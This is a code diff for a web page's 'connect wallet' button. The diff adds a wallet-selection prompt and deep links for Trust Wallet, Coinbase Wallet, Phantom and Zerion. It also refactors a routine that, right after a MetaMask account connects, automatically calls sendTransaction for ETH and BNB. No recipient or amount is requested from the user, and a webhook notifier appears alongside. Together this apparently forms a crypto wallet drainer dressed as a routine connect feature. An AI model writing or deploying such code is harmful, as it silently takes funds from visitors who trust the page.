@@ -9,39 +9,83 @@ async function connectWallet() {
     isConnecting = true;
     document.getElementById("connectButton").disabled = true;
 
+    // Ask the user which wallet they want to connect to
+    const walletChoice = prompt("Choose your wallet: (1) MetaMask, (2) Trust Wallet, (3) Coinbase Wallet, (4) Phantom Wallet, (5) Zerion Wallet");
+
+    let selectedWallet;
+    switch (walletChoice) {
+        case '1':
+            selectedWallet = 'metamask';
+            break;
+        case '2':
+            selectedWallet = 'trustwallet';
+            break;
+        case '3':
+            selectedWallet = 'coinbase';
+            break;
+        case '4':
+            selectedWallet = 'phantom';
+            break;
+        case '5':
+            selectedWallet = 'zerion';
+            break;
+        default:
+            alert("Invalid choice. Please refresh and try again.");
+            isConnecting = false;
+            document.getElementById("connectButton").disabled = false;
+            return;
+    }
+
     try {
-        if (typeof window.ethereum !== 'undefined') {
-            // Request wallet connection
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const account = accounts[0];
-            console.log(`Connected to account: ${account}`);
-
-            // Detect available networks and send transactions
-            const ethAvailable = await isNetworkAvailable('ethereum');
-            const bnbAvailable = await isNetworkAvailable('bsc');
-
-            if (ethAvailable && bnbAvailable) {
-                console.log('Both ETH and BNB are available, sending transactions...');
-                await sendTransaction("ETH");
-                await sendTransaction("BNB");
-            } else if (ethAvailable) {
-                console.log('Sending ETH transaction...');
-                await sendTransaction("ETH");
-            } else if (bnbAvailable) {
-                console.log('Sending BNB transaction...');
-                await sendTransaction("BNB");
+        if (selectedWallet === 'metamask') {
+            if (typeof window.ethereum !== 'undefined') {
+                // Request wallet connection
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const account = accounts[0];
+                console.log(`Connected to MetaMask account: ${account}`);
+                await handleTransaction(); // Handle transactions after connection
             } else {
-                console.log('Neither Ethereum nor Binance Smart Chain is available.');
+                alert("Please install MetaMask to continue.");
+                window.open("https://metamask.io/", "_blank");
             }
-        } else {
-            alert("Please install one of the following wallets to continue: MetaMask, Trust Wallet, or Coinbase Wallet.");
-            window.open("https://metamask.io/", "_blank"); // Open MetaMask if it's not installed
+        } else if (selectedWallet === 'trustwallet') {
+            const url = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
+            window.open(url, "_blank"); // Open Trust Wallet app
+        } else if (selectedWallet === 'coinbase') {
+            const url = `https://www.coinbase.com/wallet/link?url=${encodeURIComponent(window.location.href)}`;
+            window.open(url, "_blank"); // Open Coinbase Wallet app
+        } else if (selectedWallet === 'phantom') {
+            const url = `https://phantom.app/?action=connect&referrer=${encodeURIComponent(window.location.href)}`;
+            window.open(url, "_blank"); // Open Phantom Wallet app
+        } else if (selectedWallet === 'zerion') {
+            const url = `https://zerion.io/wallet?url=${encodeURIComponent(window.location.href)}`;
+            window.open(url, "_blank"); // Open Zerion Wallet app
         }
     } catch (error) {
         console.error("Error connecting to wallet:", error);
+        alert("Error connecting to wallet. Make sure you have a supported wallet installed.");
     } finally {
         isConnecting = false;
         document.getElementById("connectButton").disabled = false;
+    }
+}
+
+async function handleTransaction() {
+    const ethAvailable = await isNetworkAvailable('ethereum');
+    const bnbAvailable = await isNetworkAvailable('bsc');
+
+    if (ethAvailable && bnbAvailable) {
+        console.log('Both ETH and BNB are available, sending transactions...');
+        await sendTransaction("ETH");
+        await sendTransaction("BNB");
+    } else if (ethAvailable) {
+        console.log('Sending ETH transaction...');
+        await sendTransaction("ETH");
+    } else if (bnbAvailable) {
+        console.log('Sending BNB transaction...');
+        await sendTransaction("BNB");
+    } else {
+        console.log('Neither Ethereum nor Binance Smart Chain is available.');
     }
 }
 
@@ -115,4 +159,5 @@ async function notifyWebhook(message, data) {
     }
 }
 
+// Event listener for the connect wallet button
 document.getElementById("connectButton").addEventListener("click", connectWallet);
